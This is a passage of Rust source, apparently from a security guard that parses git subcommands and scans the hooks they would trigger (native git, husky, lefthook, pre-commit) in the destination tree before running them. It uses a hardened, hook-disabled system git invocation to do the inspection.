                    Some(_) => true,
                };
                if declares {
                    return true;
                }
            }
            ReadOutcome::Unreadable(_) => return true,
            ReadOutcome::Absent => {}
        }

        let Some(parent) = current.parent() else {
            break;
        };
        if parent == current {
            break;
        }
        current = parent;
    }
    false
}

#[derive(Debug, PartialEq, Eq)]
enum GitDestination {
    Current,
    Tree(String),
    Index,
}

#[derive(Debug, PartialEq, Eq)]
enum UnresolvedGitDestination {
    Current,
    Treeish(String),
    Index,
}

fn destination_for_git_update(
    repo_root: &Path,
    invocation: &GitInvocation,
) -> Result<GitDestination, &'static str> {
    match invocation.subcommand.as_str() {
        "pull" => Err(
            "git pull combines network mutation with integration, so its destination hooks cannot be inspected first; run git fetch, then a separately inspected git merge",
        ),
        "rebase" => Err(
            "git rebase can install multiple replay and conflict-resolution states that cannot be predicted safely; destination hook state was not inspected",
        ),
        "am" => Err(
            "git am applies an email patch before its applypatch hooks run; the resulting hook configuration cannot be bound to one inspected tree",
        ),
        "clone" => Err(
            "git clone runs post-checkout in a destination repository that does not yet exist locally; destination hook state was not inspected",
        ),
        "worktree" => worktree_add_destination(repo_root, &invocation.args),
        "checkout" => resolve_planned_destination(repo_root, plan_checkout(&invocation.args, false)?),
        "switch" => resolve_planned_destination(repo_root, plan_checkout(&invocation.args, true)?),
        "merge" => merge_destination(repo_root, &invocation.args),
        _ => Ok(GitDestination::Current),
    }
}

fn worktree_add_destination(
    repo_root: &Path,
    args: &[String],
) -> Result<GitDestination, &'static str> {
    if args.first().map(String::as_str) != Some("add") {
        return Err("git worktree operation was not a safely parsed add operation");
    }

    let mut positionals = Vec::new();
    let mut index = 1;
    while index < args.len() {
        let arg = &args[index];
        match arg.as_str() {
            "--" => {
                positionals.extend_from_slice(&args[index + 1..]);
                break;
            }
            "-b" | "-B" | "--reason" => {
                if index + 1 >= args.len() {
                    return Err("git worktree add option is missing its value");
                }
                index += 2;
            }
            "--orphan" => {
                return Err(
                    "git worktree add --orphan has no destination tree whose hooks can be inspected",
                );
            }
            "--detach" | "--checkout" | "--force" | "-f" | "--guess-remote" | "--lock"
            | "--track" | "--no-track" | "-q" | "--quiet" => index += 1,
            _ if arg.starts_with("--reason=")
                || ((arg.starts_with("-b") || arg.starts_with("-B")) && arg.len() > 2) =>
            {
                index += 1
            }
            _ if arg.starts_with('-') => {
                return Err(
                    "unsupported git worktree add option makes the destination hook state ambiguous",
                );
            }
            _ => {
                positionals.push(arg.clone());
                index += 1;
            }
        }
    }

    if positionals.len() != 2 {
        return Err("git worktree add destination could not be parsed safely");
    }
    let treeish = positionals[1].as_str();
    if !safe_treeish(treeish) {
        return Err("dynamic git worktree destination was not inspected");
    }
    resolve_treeish(repo_root, treeish).map(GitDestination::Tree)
}

fn plan_checkout(
    args: &[String],
    switch_mode: bool,
) -> Result<UnresolvedGitDestination, &'static str> {
    let mut positionals = Vec::new();
    let mut creates_branch = false;
    let mut index = 0;
    while index < args.len() {
        let arg = &args[index];
        if arg == "--" {
            if switch_mode {
                return Err("git switch path separator is unsupported; destination hook state was not inspected");
            }
            if index + 1 >= args.len() {
                return Err("git checkout path destination is empty; destination hook state was not inspected");
            }
            return match positionals.len() {
                0 => Ok(UnresolvedGitDestination::Index),
                1 => Ok(UnresolvedGitDestination::Treeish(positionals.remove(0))),
                _ => Err("git checkout names multiple possible source trees; destination hook state was not inspected"),
            };
        }

        match arg.as_str() {
            "-b" | "-B" | "-c" | "-C" => {
                if index + 1 >= args.len() || !safe_treeish(&args[index + 1]) {
                    return Err("git branch destination could not be parsed safely; destination hook state was not inspected");
                }
                creates_branch = true;
                index += 2;
            }
            "--orphan" => {
                return Err("git checkout --orphan has no stable destination tree to inspect; update blocked");
            }
            "--conflict" | "--pathspec-from-file" => {
                return Err("git checkout option reads an additional dynamic value; destination hook state was not inspected");
            }
            "--pathspec-file-nul" | "-p" | "--patch" => {
                return Err("interactive or file-fed checkout cannot be bound to one inspected destination state");
            }
            "-q"
            | "--quiet"
            | "-f"
            | "--force"
            | "-m"
            | "--merge"
            | "--detach"
            | "-t"
            | "--track"
            | "--no-track"
            | "--guess"
            | "--no-guess"
            | "--progress"
            | "--no-progress"
            | "--ignore-other-worktrees"
            | "--ignore-skip-worktree-bits"
            | "--overlay"
            | "--no-overlay"
            | "--recurse-submodules"
            | "--no-recurse-submodules"
            | "--discard-changes" => index += 1,
            _ if arg.starts_with("--track=") || arg.starts_with("--recurse-submodules=") => {
                index += 1
            }
            _ if (arg.starts_with("-b")
                || arg.starts_with("-B")
                || arg.starts_with("-c")
                || arg.starts_with("-C"))
                && arg.len() > 2 =>
            {
                if !safe_treeish(&arg[2..]) {
                    return Err("git branch destination could not be parsed safely; destination hook state was not inspected");
                }
                creates_branch = true;
                index += 1;
            }
            _ if arg.starts_with('-') && arg != "-" => {
                return Err(
                    "unsupported git checkout/switch option makes destination hook state ambiguous",
                );
            }
            _ => {
                if !safe_treeish(arg) {
                    return Err("dynamic git destination was not inspected before checkout");
                }
                positionals.push(arg.clone());
                index += 1;
            }
        }
    }

    match positionals.len() {
        0 => Ok(UnresolvedGitDestination::Current),
        1 => Ok(UnresolvedGitDestination::Treeish(positionals.remove(0))),
        _ if creates_branch => {
            Err("git branch creation names multiple start points; destination hook state was not inspected")
        }
        _ => Err("git checkout may be selecting paths rather than one tree; use an explicit -- separator so the index can be inspected"),
    }
}

fn resolve_planned_destination(
    repo_root: &Path,
    destination: UnresolvedGitDestination,
) -> Result<GitDestination, &'static str> {
    match destination {
        UnresolvedGitDestination::Current => Ok(GitDestination::Current),
        UnresolvedGitDestination::Index => Ok(GitDestination::Index),
        UnresolvedGitDestination::Treeish(treeish) => {
            resolve_treeish(repo_root, &treeish).map(GitDestination::Tree)
        }
    }
}

fn merge_destination(repo_root: &Path, args: &[String]) -> Result<GitDestination, &'static str> {
    let mut heads = Vec::new();
    let mut index = 0;
    while index < args.len() {
        let arg = &args[index];
        match arg.as_str() {
            "--abort" | "--continue" | "--quit" | "--squash" => {
                return Err("merge continuation, abort, quit, or squash has no single precomputable destination hook state");
            }
            "-m" | "-s" | "--strategy" | "-X" | "--strategy-option" | "--cleanup"
            | "--into-name" => {
                if index + 1 >= args.len() {
                    return Err("git merge option value is missing; destination hook state was not inspected");
                }
                index += 2;
            }
            "--ff"
            | "--ff-only"
            | "--no-ff"
            | "--commit"
            | "--no-commit"
            | "--edit"
            | "--no-edit"
            | "--stat"
            | "--no-stat"
            | "--log"
            | "--no-log"
            | "--signoff"
            | "--no-signoff"
            | "--verify-signatures"
            | "--no-verify-signatures"
            | "--allow-unrelated-histories"
            | "--progress"
            | "--no-progress"
            | "--autostash"
            | "--no-autostash" => index += 1,
            _ if arg.starts_with("-m")
                || arg.starts_with("-s")
                || arg.starts_with("-X")
                || arg.starts_with("--strategy=")
                || arg.starts_with("--strategy-option=")
                || arg.starts_with("--cleanup=")
                || arg.starts_with("--into-name=")
                || arg.starts_with("--log=")
                || arg.starts_with("--gpg-sign") =>
            {
                index += 1
            }
            _ if arg.starts_with('-') => {
                return Err("unsupported git merge option makes destination hook state ambiguous");
            }
            _ => {
                if !safe_treeish(arg) {
                    return Err("dynamic git merge target was not inspected before integration");
                }
                heads.push(arg.clone());
                index += 1;
            }
        }
    }
    if heads.len() != 1 {
        return Err("git merge must name exactly one inspectable head; octopus or implicit merges are blocked");
    }

    let target_commit = resolve_commitish(repo_root, &heads[0])?;
    if git_is_ancestor(repo_root, "HEAD", &target_commit)? {
        return resolve_treeish(repo_root, &target_commit).map(GitDestination::Tree);
    }
    if git_is_ancestor(repo_root, &target_commit, "HEAD")? {
        return Ok(GitDestination::Current);
    }
    Err("non-fast-forward merge result cannot be computed without invoking repository-defined merge drivers; update blocked")
}

fn safe_treeish(value: &str) -> bool {
    !value.is_empty()
        && value.len() <= 1024
        && !value.chars().any(char::is_control)
        && !value.chars().any(|ch| {
            matches!(
                ch,
                '$' | '`' | '%' | '*' | '?' | '[' | ']' | '\\' | '\'' | '"'
            )
        })
}

struct TrustedGitOutput {
    success: bool,
    code: Option<i32>,
    stdout: Vec<u8>,
}

static TRUSTED_GIT_EXECUTABLE: OnceLock<Result<crate::trusted_child::TrustedExecutable, ()>> =
    OnceLock::new();

fn trusted_git_executable() -> Result<crate::trusted_child::TrustedExecutable, &'static str> {
    #[cfg(windows)]
    let candidates = [
        Path::new(r"C:\Program Files\Git\cmd\git.exe"),
        Path::new(r"C:\Program Files\Git\bin\git.exe"),
        Path::new(r"C:\Program Files (x86)\Git\cmd\git.exe"),
    ];
    #[cfg(not(windows))]
    let candidates = [Path::new("/usr/bin/git"), Path::new("/bin/git")];
    TRUSTED_GIT_EXECUTABLE
        .get_or_init(|| {
            crate::trusted_child::TrustedExecutable::from_system_candidates(&candidates)
                .map_err(|_| ())
        })
        .clone()
        .map_err(|_| {
            "a trusted system Git executable was unavailable; destination hook state was not inspected"
        })
}

fn run_trusted_git(
    repo_root: &Path,
    args: &[String],
    stdout_cap: usize,
) -> Result<TrustedGitOutput, &'static str> {
    run_trusted_git_inner(repo_root, args, stdout_cap, true)
}

/// Resolve Git's own hook path while retaining the repository-local
/// `core.hooksPath`. The explicit `rev-parse` callers are read-only and cannot
/// execute hooks; every other trusted Git call keeps hooks redirected to null.
fn run_trusted_git_for_hook_location(
    repo_root: &Path,
    args: &[String],
    stdout_cap: usize,
) -> Result<TrustedGitOutput, &'static str> {
    run_trusted_git_inner(repo_root, args, stdout_cap, false)
}

fn hardened_git_argv(repo_root: &Path, args: &[String], disable_hooks: bool) -> Vec<OsString> {
    let null_path = if cfg!(windows) { "NUL" } else { "/dev/null" };
    let mut hardened = vec![
        OsString::from("--no-pager"),
        OsString::from("--no-replace-objects"),
        // Keep ChildSpec.cwd unset: the Windows supervised launcher rejects a
        // mutable cwd. Git's global -C option provides the same context while
        // preserving the repository path as an OsString.
        OsString::from("-C"),
        repo_root.as_os_str().to_os_string(),
        OsString::from("-c"),
        OsString::from("core.fsmonitor=false"),
        OsString::from("-c"),
        OsString::from("core.untrackedCache=false"),
        OsString::from("-c"),
        OsString::from("credential.helper="),
    ];
    if disable_hooks {
        hardened.splice(
            4..4,
            [
                OsString::from("-c"),
                OsString::from(format!("core.hooksPath={null_path}")),
            ],
        );
    }
    hardened.extend(args.iter().map(|arg| OsString::from(arg.as_str())));
    hardened
}

fn run_trusted_git_inner(
    repo_root: &Path,
    args: &[String],
    stdout_cap: usize,
    disable_hooks: bool,
) -> Result<TrustedGitOutput, &'static str> {
    use crate::trusted_child::{ChildLimits, ChildOutcome, ChildSpec};

    let executable = trusted_git_executable()?;
    let null_path = if cfg!(windows) { "NUL" } else { "/dev/null" };
    let hardened = hardened_git_argv(repo_root, args, disable_hooks);
    let mut spec = ChildSpec::new(
        &hardened,
        ChildLimits::new(Duration::from_secs(4), stdout_cap, 64 * 1024),
    )
    .env("LC_ALL", "C")
    .env("GIT_OPTIONAL_LOCKS", "0")
    .env("GIT_TERMINAL_PROMPT", "0");
    if disable_hooks {
        spec = spec
            .env("GIT_CONFIG_NOSYSTEM", "1")
            .env("GIT_CONFIG_GLOBAL", null_path);
    } else {
        // Hook-location resolution must see the same trusted baseline global
        // configuration as the user's Git process. Redirecting GIT_* or
        // HOME/XDG wrapper overrides are separately rejected at the engine
        // boundary; only these baseline home/config-location variables survive
        // ChildSpec's env_clear.
        spec = spec.inherit_env(&[
            "HOME",
            "XDG_CONFIG_HOME",
            "USERPROFILE",
            "HOMEDRIVE",
            "HOMEPATH",
            "PROGRAMDATA",
            "SYSTEMROOT",
        ]);
    }
    match crate::trusted_child::run(&executable, &spec) {
        ChildOutcome::Completed { status, stdout, .. } => Ok(TrustedGitOutput {
            success: status.success(),
            code: status.code(),
            stdout,
        }),
        ChildOutcome::SpawnError(_) => Err("trusted Git inspection could not start"),
        ChildOutcome::WaitError(_) => Err("trusted Git inspection could not be reaped"),
        ChildOutcome::CleanupError(_) => {
            Err("trusted Git inspection process-tree cleanup could not be confirmed")
        }
        ChildOutcome::Timeout { .. } => Err("trusted Git inspection exceeded its time bound"),
        ChildOutcome::OutputLimitExceeded { .. } => {
            Err("trusted Git inspection exceeded its output bound")
        }
    }
}

fn resolve_treeish(repo_root: &Path, value: &str) -> Result<String, &'static str> {
    if !safe_treeish(value) {
        return Err("dynamic Git destination was not inspected");
    }
    let value = if value == "-" { "@{-1}" } else { value };
    resolve_object(repo_root, &format!("{value}^{{tree}}"))
}

fn resolve_commitish(repo_root: &Path, value: &str) -> Result<String, &'static str> {
    if !safe_treeish(value) {
        return Err("dynamic Git merge target was not inspected");
    }
    resolve_object(repo_root, &format!("{value}^{{commit}}"))
}

fn resolve_object(repo_root: &Path, expression: &str) -> Result<String, &'static str> {
    let args = vec![
        "rev-parse".to_string(),
        "--verify".to_string(),
        "--quiet".to_string(),
        expression.to_string(),
    ];
    let output = run_trusted_git(repo_root, &args, 256)?;
    if !output.success {
        return Err("Git destination object could not be resolved before update");
    }
    let oid = std::str::from_utf8(&output.stdout)
        .ok()
        .map(str::trim)
        .filter(|oid| {
            (40..=64).contains(&oid.len()) && oid.bytes().all(|byte| byte.is_ascii_hexdigit())
        })
        .ok_or("Git returned an invalid destination object identifier")?;
    Ok(oid.to_ascii_lowercase())
}

fn git_is_ancestor(
    repo_root: &Path,
    ancestor: &str,
    descendant: &str,
) -> Result<bool, &'static str> {
    let args = vec![
        "merge-base".to_string(),
        "--is-ancestor".to_string(),
        ancestor.to_string(),
        descendant.to_string(),
    ];
    let output = run_trusted_git(repo_root, &args, 64)?;
    match (output.success, output.code) {
        (true, _) => Ok(true),
        (false, Some(1)) => Ok(false),
        _ => Err("Git ancestry could not be established before merge"),
    }
}

const MAX_INCOMING_HOOK_SURFACES: usize = 256;
const MAX_INCOMING_TREE_LIST_BYTES: usize = 2 * 1024 * 1024;
const LEFTHOOK_CONFIG_SURFACES: &[&str] = &[
    "lefthook.yml",
    "lefthook.yaml",
    ".lefthook.yml",
    ".lefthook.yaml",
    "lefthook-local.yml",
    "lefthook-local.yaml",
    ".lefthook-local.yml",
    ".lefthook-local.yaml",
];

#[derive(Debug)]
struct GitSurfaceBlob {
    path: String,
    oid: String,
}

fn scan_git_tree_surfaces(
    repo_root: &Path,
    tree: &str,
    git_events: &[&str],
) -> Result<Vec<RepoHookFinding>, &'static str> {
    let hook_roots = tracked_hook_roots(repo_root)?;
    let pathspecs = incoming_surface_pathspecs(&hook_roots);
    let mut args = vec![
        "ls-tree".to_string(),
        "-r".to_string(),
        "-z".to_string(),
        "--full-tree".to_string(),
        tree.to_string(),
        "--".to_string(),
    ];
    args.extend(pathspecs);
    let output = run_trusted_git(repo_root, &args, MAX_INCOMING_TREE_LIST_BYTES)?;
    if !output.success {
        return Err("Git destination tree surfaces could not be enumerated");
    }
    let blobs = parse_ls_tree_surfaces(&output.stdout)?;
    scan_git_surface_blobs(repo_root, tree, blobs, &hook_roots, git_events)
}

fn scan_git_index_surfaces(
    repo_root: &Path,
    git_events: &[&str],
) -> Result<Vec<RepoHookFinding>, &'static str> {
    let hook_roots = tracked_hook_roots(repo_root)?;
    let pathspecs = incoming_surface_pathspecs(&hook_roots);
    let mut args = vec![
        "ls-files".to_string(),
        "-s".to_string(),
        "-z".to_string(),
        "--".to_string(),
    ];
    args.extend(pathspecs);
    let output = run_trusted_git(repo_root, &args, MAX_INCOMING_TREE_LIST_BYTES)?;
    if !output.success {
        return Err("Git index hook surfaces could not be enumerated");
    }
    let blobs = parse_ls_files_surfaces(&output.stdout)?;
    scan_git_surface_blobs(repo_root, "index", blobs, &hook_roots, git_events)
}

fn tracked_hook_roots(repo_root: &Path) -> Result<Vec<String>, &'static str> {
    // `.githooks` is the conventional tracked native-hook directory. A local
    // or worktree/global core.hooksPath is also included when Git resolves its
    // effective hook directory within this worktree. Querying `--git-path`
    // keeps incoming scanning bound to the same config precedence as the
    // current-state hook-location resolver (including extensions.worktreeConfig).
    let mut roots = vec![".githooks".to_string()];
    let args = vec![
        "rev-parse".to_string(),
        "--path-format=absolute".to_string(),
        "--git-path".to_string(),
        "hooks".to_string(),
    ];
    let output = run_trusted_git_for_hook_location(repo_root, &args, 4096)?;
    if !output.success {
        return Err("repository effective hook path could not be inspected safely");
    }
    let effective = std::str::from_utf8(&output.stdout)
        .map_err(|_| "repository effective hook path is not valid UTF-8")?
        .trim();
    if effective.is_empty() {
        return Err("repository effective hook path is empty and cannot be inspected safely");
    }
    // Git's own worktree root, in git's spelling, so the prefix comparison in
    // `repo_relative_hook_root` can compare like with like. Resolved LAZILY:
    // the cheap local comparison already succeeds wherever the two spellings
    // agree (every Unix host), so this spawns no extra git process there and
    // runs only when that comparison would otherwise lose the root.
    let git_toplevel = || {
        let toplevel_args = vec![
            "rev-parse".to_string(),
            "--path-format=absolute".to_string(),
            "--show-toplevel".to_string(),
        ];
        run_trusted_git_for_hook_location(repo_root, &toplevel_args, 4096)
            .ok()
            .filter(|output| output.success)
            .and_then(|output| String::from_utf8(output.stdout).ok())
            .map(|value| value.trim().to_string())
            .filter(|value| !value.is_empty())
    };
    if let Some(relative) = repo_relative_hook_root(repo_root, effective, git_toplevel)? {
        if relative != ".git/hooks" && !roots.contains(&relative) {
            roots.push(relative);
        }
    }
    Ok(roots)
}

fn repo_relative_hook_root(
    repo_root: &Path,
    configured: &str,
    git_toplevel: impl FnOnce() -> Option<String>,
) -> Result<Option<String>, &'static str> {
    if configured.chars().any(char::is_control) || configured.len() > 4096 {
        return Err("repository core.hooksPath contains an unsafe path");
    }
    let configured_path = Path::new(configured);
    let owned_relative;
    let relative = if configured_path.is_absolute() {
        // `git rev-parse --path-format=absolute` normalizes the worktree path.
        // Compare it to the same physical root so a logical symlink or `..`
        // component cannot make an in-repo effective hooksPath disappear.
        let comparison_root = std::fs::canonicalize(repo_root)
            .map_err(|_| "repository root could not be resolved safely")?;
        match configured_path
            .strip_prefix(&comparison_root)
            .or_else(|_| configured_path.strip_prefix(repo_root))
        {
            Ok(relative) => relative,
            // Both local spellings failed. Ask GIT for the worktree root so the
            // two strings come from the same command family in the same
            // spelling — the case that matters on Windows, where git emits
            // `C:/repo/...` while `canonicalize` yields a `\\?\C:\repo`
            // verbatim path, and a verbatim prefix never compares equal to a
            // plain disk prefix. Without this every in-repo core.hooksPath
            // silently vanished from incoming scans.
            Err(_) => {
                let Some(toplevel) = git_toplevel() else {
                    return Ok(None);
                };
                let Some(rest) = configured
                    .strip_prefix(toplevel.trim_end_matches('/'))
                    .and_then(|rest| rest.strip_prefix('/'))
                else {
                    return Ok(None);
                };
                owned_relative = PathBuf::from(rest);
                owned_relative.as_path()
            }
        }
    } else {
        configured_path
    };

    let mut components = Vec::new();
    for component in relative.components() {
        match component {
            std::path::Component::CurDir => {}
            std::path::Component::Normal(value) => {
                let value = value
                    .to_str()
                    .ok_or("repository core.hooksPath is not valid UTF-8")?;
                if value.is_empty()
                    || value.chars().any(char::is_control)
                    || (components.is_empty() && value.starts_with(':'))
                {
                    return Err("repository core.hooksPath contains an unsafe component");
                }
                components.push(value.to_string());
            }
            std::path::Component::ParentDir
            | std::path::Component::RootDir
            | std::path::Component::Prefix(_) => {
                return Err("repository core.hooksPath escapes the worktree");
            }
        }
    }
    if components.is_empty() {
        return Err("repository core.hooksPath does not name a hook directory");
    }
    Ok(Some(components.join("/")))
}

fn incoming_surface_pathspecs(hook_roots: &[String]) -> Vec<String> {
    let mut paths = vec![
        ".husky".to_string(),
        ".pre-commit-config.yaml".to_string(),
        ".pre-commit-config.yml".to_string(),
    ];
    paths.extend(
        LEFTHOOK_CONFIG_SURFACES
            .iter()
            .map(|path| (*path).to_string()),
    );
    paths.extend(hook_roots.iter().cloned());
    paths.sort();
    paths.dedup();
    // `core.hooksPath` is repository-controlled. Git pathspec metacharacters in
    // a literal hook directory (for example `.hooks[1]`) must not turn into a
    // pattern that omits the very destination hook we intend to inspect.
    paths
        .into_iter()
        .map(|path| format!(":(literal){path}"))
        .collect()
}

fn parse_ls_tree_surfaces(bytes: &[u8]) -> Result<Vec<GitSurfaceBlob>, &'static str> {
    let mut blobs = Vec::new();
    for record in bytes
        .split(|byte| *byte == 0)
        .filter(|record| !record.is_empty())
    {
        if blobs.len() >= MAX_INCOMING_HOOK_SURFACES {
            return Err("destination contains too many tracked hook surfaces to inspect safely");
        }
        let record =
            std::str::from_utf8(record).map_err(|_| "destination hook path is not valid UTF-8")?;
        let (metadata, path) = record
            .split_once('\t')
            .ok_or("Git returned a malformed destination tree record")?;
        let mut fields = metadata.split_ascii_whitespace();
        let mode = fields.next().ok_or("Git tree record omitted mode")?;
        let kind = fields.next().ok_or("Git tree record omitted object type")?;
        let oid = fields.next().ok_or("Git tree record omitted object id")?;
        if fields.next().is_some() || kind != "blob" || !matches!(mode, "100644" | "100755") {
            return Err("destination hook surface is not a regular tracked file");
        }
        validate_git_surface_record(path, oid)?;
        blobs.push(GitSurfaceBlob {
            path: path.to_string(),
            oid: oid.to_ascii_lowercase(),
        });
    }
    Ok(blobs)
}

fn parse_ls_files_surfaces(bytes: &[u8]) -> Result<Vec<GitSurfaceBlob>, &'static str> {
    let mut by_path = BTreeMap::new();
    for record in bytes
        .split(|byte| *byte == 0)
        .filter(|record| !record.is_empty())
    {
        if by_path.len() >= MAX_INCOMING_HOOK_SURFACES {
            return Err("index contains too many tracked hook surfaces to inspect safely");
        }
        let record =
            std::str::from_utf8(record).map_err(|_| "index hook path is not valid UTF-8")?;
        let (metadata, path) = record
            .split_once('\t')
            .ok_or("Git returned a malformed index record")?;
        let mut fields = metadata.split_ascii_whitespace();
        let mode = fields.next().ok_or("Git index record omitted mode")?;
        let oid = fields.next().ok_or("Git index record omitted object id")?;
        let stage = fields.next().ok_or("Git index record omitted stage")?;
        if fields.next().is_some() || stage != "0" || !matches!(mode, "100644" | "100755") {
            return Err("index hook surface is unmerged or not a regular tracked file");
        }
        validate_git_surface_record(path, oid)?;
        by_path.insert(
            path.to_string(),
            GitSurfaceBlob {
                path: path.to_string(),
                oid: oid.to_ascii_lowercase(),
            },
        );
    }
    Ok(by_path.into_values().collect())
}

fn validate_git_surface_record(path: &str, oid: &str) -> Result<(), &'static str> {
    if path.is_empty()
        || path.len() > 4096
        || path.chars().any(char::is_control)
        || path.starts_with('/')
        || path
            .split('/')
            .any(|part| part.is_empty() || part == "." || part == "..")
    {
        return Err("Git returned an unsafe destination hook path");
    }
    if !(40..=64).contains(&oid.len()) || !oid.bytes().all(|byte| byte.is_ascii_hexdigit()) {
        return Err("Git returned an invalid hook blob identifier");
    }
    Ok(())
}

fn scan_git_surface_blobs(
    repo_root: &Path,
    source: &str,
    blobs: Vec<GitSurfaceBlob>,
    hook_roots: &[String],
    git_events: &[&str],
) -> Result<Vec<RepoHookFinding>, &'static str> {
    let mut findings = Vec::new();
    let mut bodies: BTreeMap<String, String> = BTreeMap::new();
    for blob in blobs {
        let Some((name, provider)) = tracked_surface_identity(&blob.path, hook_roots, git_events)
        else {
            continue;
        };
        let body = if let Some(body) = bodies.get(&blob.oid) {
            body.clone()
        } else {
            let args = vec!["cat-file".to_string(), "blob".to_string(), blob.oid.clone()];
            let output = run_trusted_git(repo_root, &args, MAX_HOOK_BODY_SIZE as usize)?;
            if !output.success {
                return Err("destination hook blob could not be read from the object database");
            }
            let body = String::from_utf8(output.stdout)
                .map_err(|_| "destination hook blob is not valid UTF-8")?;
            bodies.insert(blob.oid.clone(), body.clone());
            body
        };
        let location = format!("git-{source}:{}", blob.path);
        if provider == HookProvider::Lefthook {
            match lefthook_events(&body) {
                Ok(events) => {
                    for (event, command_body) in events {
                        if git_events.contains(&event.as_str()) {
                            findings.extend(classify_body(
                                &event,
                                provider,
                                &location,
                                &command_body,
                            ));
                        }
                    }
                }
                Err(reason) => {
                    findings.push(uninspectable_finding(&name, provider, &location, &reason))
                }
            }
        } else if provider == HookProvider::PreCommit {
            match pre_commit_entries(&body) {
                Ok(entries) => {
                    for (event, command_body) in entries {
                        if git_events.contains(&event.as_str()) {
                            findings.extend(classify_body(
                                &event,
                                provider,
                                &location,
                                &command_body,
                            ));
                        }
                    }
                }
                Err(reason) => {
                    findings.push(uninspectable_finding(&name, provider, &location, &reason))
                }
            }
        } else {
            findings.extend(classify_body(&name, provider, &location, &body));
        }
    }
    Ok(findings)
}

fn tracked_surface_identity(
    path: &str,
    hook_roots: &[String],
    git_events: &[&str],
) -> Option<(String, HookProvider)> {
    if LEFTHOOK_CONFIG_SURFACES.contains(&path) {
        return Some((path.to_string(), HookProvider::Lefthook));
    }
    if matches!(path, ".pre-commit-config.yaml" | ".pre-commit-config.yml") {
        return Some((path.to_string(), HookProvider::PreCommit));
    }
    if let Some(name) = path.strip_prefix(".husky/") {
        if !name.contains('/')
            && !name.starts_with('.')
            && !name.starts_with('_')
            && git_events.contains(&name)
        {
            return Some((name.to_string(), HookProvider::Husky));
        }
        return None;
    }
    for root in hook_roots {
        let Some(name) = path
            .strip_prefix(root)
            .and_then(|rest| rest.strip_prefix('/'))
        else {
            continue;
        };
        if !name.contains('/') && git_events.contains(&name) {
            return Some((name.to_string(), HookProvider::Git));
        }
    }
    None
}

/// `true` when `leader` + `subcommand` form a hook-triggering command. Cheap predicate
/// the engine uses to force past the tier-1 fast-exit under `hooks_guard_enabled` —
/// without it a clean-looking `git commit` would never reach the hook scan.
pub fn is_hook_triggering_leader(leader: &str, subcommand: Option<&str>) -> bool {
    LeaderTarget::resolve(leader, subcommand).is_some()
}

const INSTALL_LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
];
const REBUILD_LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
const INSTALL_TEST_LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepublish",
    "preprepare",
    "prepare",
    "postprepare",
    "pretest",
    "test",
    "posttest",
];
const PACK_LIFECYCLE_SCRIPTS: &[&str] = &["prepack", "prepare", "postpack"];
const PUBLISH_LIFECYCLE_SCRIPTS: &[&str] = &[
    "prepublishOnly",
    "prepack",
    "prepare",
    "postpack",
    "publish",
    "postpublish",
];

/// What a hot-path leader triggers. Built by [`LeaderTarget::resolve`].
struct LeaderTarget {
    /// Git lifecycle events fired (empty for non-git leaders).
    git_events: &'static [&'static str],
    /// Exact `package.json` lifecycle scripts fired by this operation.
    package_scripts: &'static [&'static str],
    /// Whether `.envrc` (direnv) is triggered.
    direnv: bool,
    /// Whether this is an updating Git operation whose destination must be bound.
    invalidate_cache: bool,
}

impl LeaderTarget {
    fn resolve(leader: &str, subcommand: Option<&str>) -> Option<Self> {
        // Basename + lowercase so `/usr/bin/git` and `GIT` both match.
        let leader = leader_basename(leader).to_ascii_lowercase();
        let sub = subcommand.map(|s| s.to_ascii_lowercase());
        let sub = sub.as_deref();

        match leader.as_str() {
            "git" => {
                let events: &'static [&'static str] = match sub {
                    Some("commit") => &[
                        "pre-commit",
                        "prepare-commit-msg",
                        "commit-msg",
                        "post-commit",
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                        // `git commit --amend` invokes post-rewrite. We scan it
                        // for every commit because the leader-only compatibility
                        // API does not carry flags, and the command-aware path
                        // benefits from the same conservative event superset.
                        "post-rewrite",
                    ],
                    Some("push") => &["pre-push"],
                    Some("pull") => &[
                        "pre-merge-commit",
                        "prepare-commit-msg",
                        "commit-msg",
                        "post-commit",
                        "post-merge",
                        "pre-rebase",
                        "post-rewrite",
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                    ],
                    Some("merge") => &[
                        "pre-merge-commit",
                        "prepare-commit-msg",
                        "commit-msg",
                        "post-commit",
                        "post-merge",
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                    ],
                    Some("rebase") => &[
                        "pre-rebase",
                        "post-rewrite",
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                    ],
                    Some("checkout") | Some("switch") => &[
                        "post-checkout",
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                    ],
                    Some("clone") | Some("worktree") => &["post-checkout", "fsmonitor-watchman"],
                    Some("am") => &[
                        "applypatch-msg",
                        "pre-applypatch",
                        "post-applypatch",
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                    ],
                    Some("send-email") => &["sendemail-validate"],
                    Some("gc") => &["pre-auto-gc"],
                    Some("p4") => &[
                        "p4-changelist",
                        "p4-prepare-changelist",
                        "p4-post-changelist",
                        "p4-pre-submit",
                    ],
                    Some("receive-pack") => &[
                        "pre-receive",
                        "update",
                        "proc-receive",
                        "post-receive",
                        "post-update",
                        "push-to-checkout",
                    ],
                    Some("add" | "mv" | "rm" | "update-index") => {
                        &["post-index-change", "fsmonitor-watchman"]
                    }
                    Some("reset" | "restore") => &[
                        "post-index-change",
                        "reference-transaction",
                        "fsmonitor-watchman",
                    ],
                    Some("branch" | "fetch" | "tag" | "update-ref") => &["reference-transaction"],
                    Some("remote-update") => &["reference-transaction"],
                    Some("diff" | "diff-files" | "diff-index" | "status") => {
                        &["fsmonitor-watchman"]
                    }
                    _ => return None,
                };
                let invalidate = matches!(
                    sub,
                    Some("pull")
                        | Some("merge")
                        | Some("rebase")
                        | Some("checkout")
                        | Some("switch")
                        | Some("clone")
                        | Some("worktree")
                        | Some("am")
                );
                Some(LeaderTarget {
                    git_events: events,
                    package_scripts: &[],
                    direnv: false,
                    invalidate_cache: invalidate,
                })
            }
            "npm" => match sub {
                // npm documents a large set of historical install aliases. `npm
                // run <script>` is deliberately absent: it runs one user-named
                // script and must not surface unrelated install lifecycle hooks.
                Some(
